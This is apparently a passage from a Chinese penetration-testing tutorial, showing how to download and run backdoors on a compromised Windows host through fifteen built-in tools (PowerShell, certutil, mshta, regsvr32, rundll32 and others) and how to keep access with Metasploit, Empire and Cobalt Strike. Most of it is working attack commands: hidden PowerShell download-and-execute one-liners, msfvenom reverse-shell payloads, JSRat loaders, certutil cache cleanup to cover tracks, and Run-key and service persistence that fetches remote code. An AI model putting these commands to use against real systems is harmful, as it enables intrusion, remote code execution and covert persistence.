title="第5篇：Windows命令行文件下载方式汇总"></a>第5篇：Windows命令行文件下载方式汇总</h2><p>当我们通过Web渗透获取了一个Shell，而且目标主机是Windows，我们该怎么去下载后门文件到目标主机上执行呢？</p><p>一般来说，实现Windows文件下载执行的方式不外乎以下几种方式。第一种，远程下载文件到本地，然后再执行；<strong>第二种，远程下载执行，执行过程没有二进制文件落地，这种方式已然成为后门文件下载执行的首要方式**</strong>。**另外呢，只要你所在服务器的环境支持，你也可以通过任何一门语言来实现它，这种方式暂不在本文的讨论范围之内。</p><p><strong>在这里，**</strong>本文收集了15种常见的文件下载执行的方式，并结合具体案例**，让我们一起来看看是怎么实现的吧。</p><hr><ul><li>PowerShell</li><li>Bitsadmin</li><li>certutil</li><li>wget</li><li>ipc$文件共享</li><li>FTP</li><li>TFTP</li><li>WinScp</li><li>msiexec</li><li>IEExec</li><li>mshta</li><li>rundll32</li><li>regsvr32 </li><li>MSXSL.EXE</li><li>pubprn.vbs</li></ul><hr><p><strong>1、PowerShell</strong></p><p>PowerShell是一种命令行外壳程序和脚本环境，使命令行用户和脚本编写者可以利用。</p><p>远程下载文件保存在本地：</p><pre><code class="hljs reasonml">powershell (<span class="hljs-keyword">new</span>-object System.Net.WebClient).<span class="hljs-constructor">DownloadFile('<span class="hljs-params">http</span>:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>192.168.28.128<span class="hljs-operator">/</span><span class="hljs-params">imag</span><span class="hljs-operator">/</span><span class="hljs-params">evil</span>.<span class="hljs-params">txt</span>','<span class="hljs-params">evil</span>.<span class="hljs-params">exe</span>')</span></code></pre><p>远程执行命令：</p><pre><code class="hljs llvm">powershell -nop -w <span class="hljs-keyword">hidden</span> -<span class="hljs-keyword">c</span> <span class="hljs-string">"IEX ((new-object net.webclient).downloadstring('http://192.168.28.128/imag/evil.txt'))"</span></code></pre><p><img src="/image/20200413-1.png" srcset="/img/loading.gif" alt=""></p><p><strong>2、Bitsadmin</strong></p><p>bitsadmin是一个命令行工具，可用于创建下载或上传工作和监测其进展情况。</p><pre><code class="hljs groovy">bitsadmin <span class="hljs-regexp">/transfer n http:/</span><span class="hljs-regexp">/192.168.28.128/</span>imag/evil.txt <span class="hljs-string">d:</span>\test\<span class="hljs-number">1.</span>txt</code></pre><p>输入以上命令，成功下载文件。</p><p><img src="/image/20200413-2.png" srcset="/img/loading.gif" alt=""></p><p><strong>3、certutil</strong></p><p>用于备份证书服务，支持xp-win10都支持。由于certutil下载文件都会留下缓存，所以一般都建议下载完文件后对缓存进行删除。</p><p>注：缓存目录为：”%USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content”</p><pre><code class="hljs awk"><span class="hljs-comment">#下载文件</span>certutil -urlcache -split -f http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">28.128</span><span class="hljs-regexp">/imag/</span>evil.txt test.php<span class="hljs-comment">#删除缓存</span>certutil -urlcache -split -f http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">28.128</span><span class="hljs-regexp">/imag/</span>evil.txt <span class="hljs-keyword">delete</span></code></pre><p><img src="/image/20200413-3.png" srcset="/img/loading.gif" alt=""></p><p><strong>4、wget</strong></p><p>Windows环境下，可上传免安装的可执行程序wget.exe到目标机器，使用wget下载文件。</p><p>wget.exe下载：<a href="https://eternallybored.org/misc/wget/" target="_blank" rel="noopener">https://eternallybored.org/misc/wget/</a></p><pre><code class="hljs awk">wget -O <span class="hljs-string">"evil.txt"</span> http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">28.128</span><span class="hljs-regexp">/imag/</span>evil.txt</code></pre><p><img src="/image/20200413-4.png" srcset="/img/loading.gif" alt=""></p><p><strong>5、ipc$文件共享</strong></p><p>IPC$(Internet Process Connection)是共享”命名管道”的资源，它是为了让进程间通信而开放的命名管道，通过提供可信任的用户名和口令，连接双方可以建立安全的通道并以此通道进行加密数据的交换，从而实现对远程计算机的访问。</p><pre><code class="hljs angelscript">#建立远程IPC连接net use \\<span class="hljs-number">192.168</span><span class="hljs-number">.28</span><span class="hljs-number">.128</span>\ipc$ /user:administrator <span class="hljs-string">"abc123!"</span>#复制远程文件到本地主机copy \\<span class="hljs-number">192.168</span><span class="hljs-number">.28</span><span class="hljs-number">.128</span>\c$\<span class="hljs-number">2.</span>txt D:\test</code></pre><p><img src="/image/20200413-5.png" srcset="/img/loading.gif" alt=""></p><p>*<em>6、FTP *</em></p><p>一般情况下攻击者使用FTP上传文件需要很多交互的步骤，下面这个 bash脚本，考虑到了交互的情况，可以直接执行并不会产生交互动作。</p><pre><code class="hljs awk">ftp <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>usernamepasswordget file<span class="hljs-keyword">exit</span></code></pre><p><img src="/image/20200413-6.png" srcset="/img/loading.gif" alt=""></p><p><strong>7、TFTP</strong></p><p>用来下载远程文件的最简单的网络协议，它基于UDP协议而实现</p><p>tftp32服务端下载地址：<a href="http://tftpd32.jounin.net/tftpd32_download.html" target="_blank" rel="noopener">http://tftpd32.jounin.net/tftpd32_download.html</a></p><pre><code class="hljs armasm"><span class="hljs-symbol">tftp</span> -i 你的<span class="hljs-built_in">IP</span> <span class="hljs-meta">get</span> 要下载文件 存放位置</code></pre><p><img src="/image/20200413-7.png" srcset="/img/loading.gif" alt=""></p><p><strong>8、WinScp</strong></p><p>WinSCP是一个Windows环境下使用SSH的开源图形化SFTP客户端。</p><pre><code class="hljs routeros"><span class="hljs-comment">#上传</span>winscp.exe <span class="hljs-built_in">/console </span>/command <span class="hljs-string">"option batch continue"</span> <span class="hljs-string">"option confirm off"</span> <span class="hljs-string">"open sftp://bypass:abc123!@192.168.28.131:22"</span> <span class="hljs-string">"option transfer binary"</span> <span class="hljs-string">"put D:\1.txt  /tmp/"</span> <span class="hljs-string">"exit"</span> /<span class="hljs-attribute">log</span>=log_file.txt <span class="hljs-comment">#下载</span>winscp.exe <span class="hljs-built_in">/console </span>/command <span class="hljs-string">"option batch continue"</span> <span class="hljs-string">"option confirm off"</span> <span class="hljs-string">"open sftp://bypass:abc123!@192.168.28.131:22"</span> <span class="hljs-string">"option transfer binary"</span> <span class="hljs-string">"get /tmp D:\test\app\" "</span>exit<span class="hljs-string">" /log=log_file.tx</span></code></pre><p>使用winscp.exe 作为命令行参数执行远程上传/下载操作。</p><p><img src="/image/20200413-8.png" srcset="/img/loading.gif" alt=""></p><p><strong>9、msiexec</strong></p><p>msiexec 支持远程下载功能，将msi文件上传到服务器，通过如下命令远程执行：</p><pre><code class="hljs jboss-cli"><span class="hljs-comment">#生成msi包</span>msfvenom -p windows/exec CMD='net user test abc123! <span class="hljs-string">/add</span>' -f msi &gt; evil.msi<span class="hljs-comment">#远程执行</span>msiexec <span class="hljs-string">/q</span> <span class="hljs-string">/i</span> http:<span class="hljs-string">//192.168.28.128/evil.msi</span></code></pre><p>成功添加了一个test用户：</p><p><img src="/image/20200413-9.png" srcset="/img/loading.gif" alt=""></p><p><strong>10、IEExec</strong></p><p>IEexec.exe应用程序是.NET Framework附带程序，存在于多个系统白名单内。</p><p>生成Payload：</p><pre><code class="hljs angelscript">msfvenom -p windows/meterpreter/reverse_tcp lhost=<span class="hljs-number">192.168</span><span class="hljs-number">.28</span><span class="hljs-number">.131</span> lport=<span class="hljs-number">4444</span> -f exe -o evil.exe</code></pre><p>使用管理员身份打开cmd，分别运行下面两条命令。</p><pre><code class="hljs taggerscript">C:<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\M</span>icrosoft.NET<span class="hljs-symbol">\F</span>ramework64<span class="hljs-symbol">\v</span>2.0.50727&gt;caspol.exe -s offC:<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\M</span>icrosoft.NET<span class="hljs-symbol">\F</span>ramework64<span class="hljs-symbol">\v</span>2.0.50727&gt;IEExec.exe http://192.168.28.131/evil.exe</code></pre><p><img src="/image/20200413-10.png" srcset="/img/loading.gif" alt=""></p><p><strong>11、mshta</strong></p><p>mshta用于执行.hta文件，而hta是HTML Applocation 的缩写，也就是HTML应用程序。而hta中也支持VBS。所以我们可以利用hta来下载文件。</p><pre><code class="hljs dockerfile">mshta http://<span class="hljs-number">192.168</span>.<span class="hljs-number">28.128</span>/<span class="hljs-keyword">run</span>.<span class="bash">hta</span></code></pre><p>run.hta内容如下：</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">HTML</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">"Content-Type"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"text/html; charset=utf-8"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">HEAD</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">"VBScript"</span>&gt;</span>Window.ReSizeTo 0, 0Window.moveTo -2000,-2000<span class="javascript"><span class="hljs-built_in">Set</span> objShell = CreateObject(<span class="hljs-string">"Wscript.Shell"</span>)</span><span class="actionscript">objShell.Run <span class="hljs-string">"cmd.exe /c net user test password /add"</span> <span class="hljs-comment">// 这里填写命令</span></span>self.close<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>demo<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">HEAD</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-name">HTML</span>&gt;</span></code></pre><p><img src="/image/20200413-11.png" srcset="/img/loading.gif" alt=""></p><p><strong>12、rundll32</strong></p><p>其实还是依赖于WScript.shell这个组件，在这里我们使用JSRat来做演示，JSRat是一个命令和控制框架，仅为rundll32.exe和regsvr32.exe生成恶意程序。</p><p>项目地址：<a href="https://github.com/Hood3dRob1n/JSRat-Py.git" target="_blank" rel="noopener">https://github.com/Hood3dRob1n/JSRat-Py.git</a></p><p>步骤一：开始运行JSRat，监听本地8888端口。</p><p><img src="/image/20200413-12-1.png" srcset="/img/loading.gif" alt=""></p><p>步骤二：通过url访问，可以查看恶意代码。</p><p><img src="/image/20200413-12-2.png" srcset="/img/loading.gif" alt=""></p><p>复制代码如下：</p><pre><code class="hljs reasonml">rundll32.exe javascript:<span class="hljs-string">"\..\mshtml,RunHTMLApplication "</span>;document.write<span class="hljs-literal">()</span>;h=<span class="hljs-keyword">new</span>%<span class="hljs-number">20</span><span class="hljs-constructor">ActiveXObject(<span class="hljs-string">"WinHttp.WinHttpRequest.5.1"</span>)</span>;h.<span class="hljs-constructor">Open(<span class="hljs-string">"GET"</span>,<span class="hljs-string">"http://192.168.28.131:8888/connect"</span>,<span class="hljs-params">false</span>)</span>;<span class="hljs-keyword">try</span>{h.<span class="hljs-constructor">Send()</span>;b=h.ResponseText;eval(b);}catch(e){<span class="hljs-keyword">new</span>%<span class="hljs-number">20</span><span class="hljs-constructor">ActiveXObject(<span class="hljs-string">"WScript.Shell"</span>)</span>.<span class="hljs-constructor">Run(<span class="hljs-string">"cmd /c taskkill /f /im rundll32.exe"</span>,0,<span class="hljs-params">true</span>)</span>;}</code></pre><p>步骤三：在受害者PC运行该代码，将成功返回一个会话，如下图所示：</p><p><img src="/image/20200413-12-3.png" srcset="/img/loading.gif" alt=""></p><p>*<em>13、regsvr32 *</em></p><p>Regsvr32命令用于注册COM组件，是Windows系统提供的用来向系统注册控件或者卸载控件的命令，以命令行方式运行</p><p>在目标机上执行：</p><pre><code class="hljs groovy">regsvr32.exe <span class="hljs-regexp">/u /</span>n <span class="hljs-regexp">/s /</span><span class="hljs-string">i:</span><span class="hljs-string">http:</span><span class="hljs-comment">//192.168.28.131:8888/file.sct scrobj.dll</span></code></pre><p>可以通过自己构造.sct文件，去下载执行我们的程序</p><pre><code class="hljs dust"><span class="xml"><span class="hljs-meta">&lt;?XML version="1.0"?&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">scriptlet</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">registration</span></span></span><span class="xml">    progid="ShortJSRAT"</span><span class="xml">    classid="</span><span class="hljs-template-variable">{10001111-0000-0000-0000-0000FEEDACDC}</span><span class="xml">" &gt;</span><span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">"JScript"</span>&gt;</span></span><span class="xml">        &lt;![CDATA[</span><span class="xml">            ps  = "cmd.exe /c calc.exe";</span><span class="xml">            new ActiveXObject("WScript.Shell").Run(ps,0,true);</span><span class="xml">        ]]&gt;</span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">registration</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">scriptlet</span>&gt;</span></span></code></pre><p>执行命令，成功弹计算器：</p><p><img src="/image/20200413-13.png" srcset="/img/loading.gif" alt=""></p><p><strong>14、MSXSL.EXE</strong></p><p>msxsl.exe是微软用于命令行下处理XSL的一个程序，所以通过他，我们可以执行JavaScript进而执行系统命令。</p><p>下载地址为：<a href="https://www.microsoft.com/en-us/download/details.aspx?id=21714" target="_blank" rel="noopener">https://www.microsoft.com/en-us/download/details.aspx?id=21714</a></p><p>msxsl.exe 需要接受两个文件，XML及XSL文件，可以远程加载，具体方式如下：</p><pre><code class="hljs awk">msxsl http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">28.128</span><span class="hljs-regexp">/scripts/</span>demo.xml http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">28.128</span><span class="hljs-regexp">/scripts/</span>exec.xsl</code></pre><p>demo.xml</p><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version="1.0"?&gt;</span><span class="hljs-meta">&lt;?xml-stylesheet type="text/xsl" href="exec.xsl" ?&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">customers</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">customer</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>Microsoft<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">customer</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">customers</span>&gt;</span></code></pre><p>exec.xsl</p><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version='1.0'?&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">xsl:stylesheet</span> <span class="hljs-attr">version</span>=<span class="hljs-string">"1.0"</span></span><span class="hljs-tag"><span class="hljs-attr">xmlns:xsl</span>=<span class="hljs-string">"http://www.w3.org/1999/XSL/Transform"</span></span><span class="hljs-tag"><span class="hljs-attr">xmlns:msxsl</span>=<span class="hljs-string">"urn:schemas-microsoft-com:xslt"</span></span><span class="hljs-tag"><span class="hljs-attr">xmlns:user</span>=<span class="hljs-string">"http://mycompany.com/mynamespace"</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">msxsl:script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">"JScript"</span> <span class="hljs-attr">implements-prefix</span>=<span class="hljs-string">"user"</span>&gt;</span>   function xml(nodelist) {var r = new ActiveXObject("WScript.Shell").Run("cmd /c calc.exe");   return nodelist.nextNode().xml;     }<span class="hljs-tag">&lt;/<span class="hljs-name">msxsl:script</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">xsl:template</span> <span class="hljs-attr">match</span>=<span class="hljs-string">"/"</span>&gt;</span>   <span class="hljs-tag">&lt;<span class="hljs-name">xsl:value-of</span> <span class="hljs-attr">select</span>=<span class="hljs-string">"user:xml(.)"</span>/&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">xsl:template</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">xsl:stylesheet</span>&gt;</span></code></pre><p><img src="/image/20200413-14.png" srcset="/img/loading.gif" alt=""></p><p><strong>15、pubprn.vbs</strong></p><p>在Windows 7以上版本存在一个名为PubPrn.vbs的微软已签名WSH脚本，其位于C:\Windows\System32\Printing_Admin_Scripts\en-US，仔细观察该脚本可以发现其显然是由用户提供输入（通过命令行参数），之后再将参数传递给GetObject()</p><pre><code class="hljs taggerscript">"C:<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\S</span>ystem32<span class="hljs-symbol">\P</span>rinting_Admin_Scripts<span class="hljs-symbol">\z</span>h-CN<span class="hljs-symbol">\p</span>ubprn.vbs" 127.0.0.1 script:https://gist.githubusercontent.com/enigma0x3/64adf8ba99d4485c478b67e03ae6b04a/raw/a006a47e4075785016a62f7e5170ef36f5247cdb/test.sct</code></pre><p>test.sct</p><pre><code class="hljs dust"><span class="xml"><span class="hljs-meta">&lt;?XML version="1.0"?&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">scriptlet</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">registration</span></span></span><span class="xml">    description="Bandit"</span><span class="xml">    progid="Bandit"</span><span class="xml">    version="1.00"</span><span class="xml">    classid="</span><span class="hljs-template-variable">{AAAA1111-0000-0000-0000-0000FEEDACDC}</span><span class="xml">"</span><span class="xml">    remotable="true"</span><span class="xml">&gt;</span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">registration</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">"JScript"</span>&gt;</span></span><span class="xml">&lt;![CDATA[</span><span class="xml">var r = new ActiveXObject("WScript.Shell").Run("calc.exe");</span><span class="xml">]]&gt;</span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">scriptlet</span>&gt;</span></span></code></pre><p><img src="/image/20200413-15.png" srcset="/img/loading.gif" alt=""></p><p>参考文章：</p><p><a href="https://xz.aliyun.com/t/1654/" target="_blank" rel="noopener">https://xz.aliyun.com/t/1654/</a></p><p><a href="https://evi1cg.me/archives/remote_exec.html" target="_blank" rel="noopener">https://evi1cg.me/archives/remote_exec.html</a></p><p>收集整理的15种文件下载的方式</p><p><a href="https://mp.weixin.qq.com/s/DfdUL5jFzJ8PvylxS6mN-A" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/DfdUL5jFzJ8PvylxS6mN-A</a></p><p>Windows执行命令与下载文件总结 </p><p> <a href="https://www.cnblogs.com/17bdw/p/8550189.html" target="_blank" rel="noopener">https://www.cnblogs.com/17bdw/p/8550189.html</a></p><p>在windows上执行恶意代码 by rundll32 &amp; regsvr32  </p><p><a href="https://www.jianshu.com/p/e8f65deac245" target="_blank" rel="noopener">https://www.jianshu.com/p/e8f65deac245</a></p><p>IEexec.exe执行payload</p><p><a href="https://www.codercto.com/a/104908.html" target="_blank" rel="noopener">https://www.codercto.com/a/104908.html</a></p><p>rundll32.exe 多种方法绕过白名单</p><p><a href="https://www.cnblogs.com/backlion/p/10488747.html" target="_blank" rel="noopener">https://www.cnblogs.com/backlion/p/10488747.html</a></p><pre><code class="hljs plain"></code></pre><h2 id="第6篇：三大渗透测试框架权限维持技术"><a href="#第6篇：三大渗透测试框架权限维持技术" class="headerlink" title="第6篇：三大渗透测试框架权限维持技术"></a>第6篇：三大渗透测试框架权限维持技术</h2><h3 id="0x00-前言-5"><a href="#0x00-前言-5" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>在渗透测试中，有三个非常经典的渗透测试框架—-Metasploit、Empire、Cobalt Strike。</p><p>那么，通过漏洞获取到目标主机权限后，如何利用框架获得持久性权限呢？</p><h3 id="0x01-MSF权限维持"><a href="#0x01-MSF权限维持" class="headerlink" title="0x01 MSF权限维持"></a>0x01 MSF权限维持</h3><p>使用MSF维持权限的前提是先获得一个<em>meterpreter</em>  shell，通过<em>meterpreter</em> shell获取持久性shell的方法有两种：</p><p><strong>Persistence模块</strong></p><p>通过启动项启动(persistence)的方式，在目标机器上以反弹回连。</p><p><img src="/image/privilege-3-1.png" srcset="/img/loading.gif" alt=""></p><pre><code class="hljs taggerscript">-U：设置后门在用户登录后自启动。该方式会在HKCU<span class="hljs-symbol">\S</span>oftware<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\R</span>un下添加注册表信息。推荐使用该参数；-X：设置后门在系统启动后自启动。该方式会在HKLM<span class="hljs-symbol">\S</span>oftware<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\R</span>un下添加注册表信息。由于权限问题，会导致添加失败，后门将无法启动。-S：作为服务自动启动代理程序（具有SYSTEM权限）</code></pre><p>生成的相关文件位置 ：</p><pre><code class="hljs tex"># 后门文件位置：C:<span class="hljs-tag">\<span class="hljs-name">Windows</span></span><span class="hljs-tag">\<span class="hljs-name">Temp</span></span>C:<span class="hljs-tag">\<span class="hljs-name">Users</span></span><span class="hljs-tag">\<span class="hljs-name">Administrator</span></span><span class="hljs-tag">\<span class="hljs-name">AppData</span></span><span class="hljs-tag">\<span class="hljs-name">Local</span></span><span class="hljs-tag">\<span class="hljs-name">Temp</span></span># 注册表位置：HKCU<span class="hljs-tag">\<span class="hljs-name">Software</span></span><span class="hljs-tag">\<span class="hljs-name">Microsoft</span></span><span class="hljs-tag">\<span class="hljs-name">Windows</span></span><span class="hljs-tag">\<span class="hljs-name">CurrentVersion</span></span><span class="hljs-tag">\<span class="hljs-name">Run</span></span><span class="hljs-tag">\</span>HKLM<span class="hljs-tag">\<span class="hljs-name">Software</span></span><span class="hljs-tag">\<span class="hljs-name">Microsoft</span></span><span class="hljs-tag">\<span class="hljs-name">Windows</span></span><span class="hljs-tag">\<span class="hljs-name">CurrentVersion</span></span><span class="hljs-tag">\<span class="hljs-name">Run</span></span><span class="hljs-tag">\</span></code></pre><p><img src="/image/privilege-3-2.png" srcset="/img/loading.gif" alt=""></p><p><strong>Metsvc 模块</strong></p><p>通过服务(metsvc)启动的方式，在目标机器启动后自启动一个服务，等待连接。</p><p><img src="/image/privilege-3-3.png" srcset="/img/loading.gif" alt=""></p><p>后门排查：目标主机上开启了一个Meterpreter服务。</p><p><img src="/image/privilege-3-4.png" srcset="/img/loading.gif" alt=""></p><h3 id="0x02-Empire-权限维持"><a href="#0x02-Empire-权限维持" class="headerlink" title="0x02 Empire 权限维持"></a>0x02 Empire 权限维持</h3><p>Empire的persistence模块提供了18种权限维持的方法，大致可以分为四类，即</p><p><img src="/image/privilege-3-17.png" srcset="/img/loading.gif" alt=""></p><table><thead><tr><th align="left">elevated（管理权限）</th><th align="left">misc（杂项）</th><th align="left">powerbreach</th><th align="left">userland（用户权限）</th></tr></thead><tbody><tr><td align="left">registry*</td><td align="left">add_netuser</td><td align="left">deaduser</td><td align="left">backdoor_lnk</td></tr><tr><td align="left">schtasks*</td><td align="left">add_sid_history*</td><td align="left">eventlog*</td><td align="left">registry</td></tr><tr><td align="left">wmi*</td><td align="left">debugger*</td><td align="left">resolver</td><td align="left">schtasks</td></tr><tr><td align="left">wmi_updater*</td><td align="left">disable_machine_acct_change*</td><td align="left"></td><td align="left"></td></tr><tr><td align="left"></td><td align="left">get_ssps</td><td align="left"></td><td align="left"></td></tr><tr><td align="left"></td><td align="left">install_ssp*</td><td align="left"></td><td align="left"></td></tr><tr><td align="left"></td><td align="left">memssp*</td><td align="left"></td><td align="left"></td></tr><tr><td align="left"></td><td align="left">skeleton_key*</td><td align="left"></td><td align="left"></td></tr></tbody></table><p><strong>注册表</strong></p><pre><code class="hljs lisp">(<span class="hljs-name">Empire</span>: agents) &gt; agents(<span class="hljs-name">Empire</span>: agents) &gt; interact URL3FZBV(<span class="hljs-name">Empire</span>: URL3FZBV) &gt; usemodule persistence/elevated/registry*(<span class="hljs-name">Empire</span>: powershell/persistence/elevated/registry) &gt; set Listener test(<span class="hljs-name">Empire</span>: powershell/persistence/elevated/registry) &gt; execute</code></pre><p><img src="/image/privilege-3-5.png" srcset="/img/loading.gif" alt=""></p><p>因为是开机启动，所以会弹个黑框，之后还会弹出注册表添加的powershell启动项的框，在注册表位置如下：</p><p><img src="/image/privilege-3-6.png" srcset="/img/loading.gif" alt=""></p><p><strong>计划任务</strong></p><pre><code class="hljs groovy">(<span class="hljs-string">Empire:</span> agents) &gt; interact <span class="hljs-number">9</span>NZ2RWBC(<span class="hljs-string">Empire:</span> <span class="hljs-number">9</span>NZ2RWBC) &gt; usemodule persistence<span class="hljs-regexp">/elevated/</span>schtasks*(<span class="hljs-string">Empire:</span> powershell<span class="hljs-regexp">/persistence/</span>elevated/schtasks) &gt; set Listener test(<span class="hljs-string">Empire:</span> powershell<span class="hljs-regexp">/persistence/</span>elevated/schtasks) &gt; set DailyTime <span class="hljs-number">22</span>:<span class="hljs-number">50</span>(<span class="hljs-string">Empire:</span> powershell<span class="hljs-regexp">/persistence/</span>elevated/schtasks) &gt; execute</code></pre><p><img src="/image/privilege-3-7.png" srcset="/img/loading.gif" alt=""></p><p>在任务计划程序库可以看到-任务为Updater-启动程序如下可以到为powershell</p><p><img src="/image/privilege-3-8.png" srcset="/img/loading.gif" alt=""></p><p><strong>wmi</strong></p><pre><code class="hljs lisp">(<span class="hljs-name">Empire</span>: agents) &gt; interact <span class="hljs-number">9</span>NZ2RWBC(<span class="hljs-name">Empire</span>: <span class="hljs-number">9</span>NZ2RWBC) &gt; usemodule persistence/elevated/wmi(<span class="hljs-name">Empire</span>: powershell/persistence/elevated/wmi) &gt; set Listener test(<span class="hljs-name">Empire</span>: powershell/persistence/elevated/wmi) &gt; run</code></pre><p><img src="/image/privilege-3-9.png" srcset="/img/loading.gif" alt=""></p><p>如何清除后门，最简单的方法就是使用Autoruns，选择WMI选项卡，右键就可以删除恶意后门。</p><p><img src="/image/privilege-3-10.png" srcset="/img/loading.gif" alt=""></p><h3 id="0x03-Cobalt-Strike权限维持"><a href="#0x03-Cobalt-Strike权限维持" class="headerlink" title="0x03 Cobalt Strike权限维持"></a>0x03 Cobalt Strike权限维持</h3><p>通过Cobalt Strike拿到一个shell，留后门的方法有很多，下面介绍两种比较常见的无文件、自启动后门。</p><p>从Cobalt Strike菜单栏，Attacks–Web Drive-by–Scaripted Web Delivery，生成powershell后门。</p><p><img src="/image/privilege-3-11.png" srcset="/img/loading.gif" alt=""></p><p>根据需要可以自己选择，填写所需参数默认端口是80（需要注意的就是不要使用重复端口），Type选择powershell。</p><p><img src="/image/privilege-3-12.png" srcset="/img/loading.gif" alt=""></p><p>点击Launch后，返回powershell远程下载执行命令。</p><p><img src="/image/privilege-3-13.png" srcset="/img/loading.gif" alt=""></p><p><strong>服务自启动后门</strong></p><pre><code class="hljs sql">sc <span class="hljs-keyword">create</span> <span class="hljs-string">"Name"</span> binpath= <span class="hljs-string">"cmd /c start powershell.exe -nop -w hidden -c \"</span>IEX ((<span class="hljs-keyword">new</span>-<span class="hljs-keyword">object</span> net.webclient).downloadstring(<span class="hljs-string">'http://192.168.28.142:8080/a'</span>))\<span class="hljs-string">""</span>sc description  <span class="hljs-keyword">Name</span> <span class="hljs-string">"Just For Test"</span>   //设置服务的描述字符串sc config <span class="hljs-keyword">Name</span> <span class="hljs-keyword">start</span>= <span class="hljs-keyword">auto</span>             //设置这个服务为自动启动 net <span class="hljs-keyword">start</span> <span class="hljs-keyword">Name</span>                         //启动服务</code></pre><p>重启服务器后，成功返回一个shell。</p><p><img src="/image/privilege-3-14.png" srcset="/img/loading.gif" alt=""></p><p><strong>注册表自启动</strong></p><p>在windows启动项注册表里面添加一个木马程序路径，如：</p><pre><code class="hljs taggerscript">beacon&gt;getsystembeacon&gt;shell reg add HKLM<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\R</span>un /v "Keyname" /t REG_SZ /d "C:<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\S</span>ystem32<span class="hljs-symbol">\W</span>indowsPowerShell<span class="hljs-symbol">\v</span>1.0<span class="hljs-symbol">\p</span>owershell.exe -nop -w hidden -c <span class="hljs-symbol">\"</span>IEX ((new-object net.webclient).downloadstring('http://192.168.28.142:8080/a'))<span class="hljs-symbol">\"</span>" /f</code></pre><p><img src="/image/privilege-3-15.png" srcset="/img/loading.gif" alt=""></p><p> 账号注销后，重新登录，界面上会出现powershell快速闪过消失，成功返回shell。</p><p><img src="/image/privilege-3-16.png" srcset="/img/loading.gif" alt=""></p><p>注册表还有哪些键值可以设置为自启动：</p><pre><code class="hljs taggerscript">HKEY_CURRENT_USER<span class="hljs-symbol">\S</span>oftware<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\R</span>un HKEY_LOCAL_MACHINE<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\R</span>un HKEY_LOCAL_MACHINE<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows NT<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\W</span>inlogon</code></pre><hr><h3 